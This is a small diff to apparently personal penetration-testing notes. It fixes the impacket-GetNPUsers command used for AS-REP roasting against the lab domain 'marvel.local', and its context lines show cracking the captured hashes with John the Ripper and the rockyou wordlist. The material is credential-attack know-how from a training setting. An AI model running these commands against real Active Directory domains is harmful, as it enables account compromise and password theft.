@@ -43,7 +43,7 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 
 ```
 # using impacket
-impacket-GetNPUsers.py marvel.local -usersfile users.txt -no-pass -format john -outputfile hash.txt
+impacket-GetNPUsers marvel.local -usersfile users.txt -no-pass -format john -outputfile hash.txt
 
 # put the hash in a file
 echo 'hash we got' > hash.txt
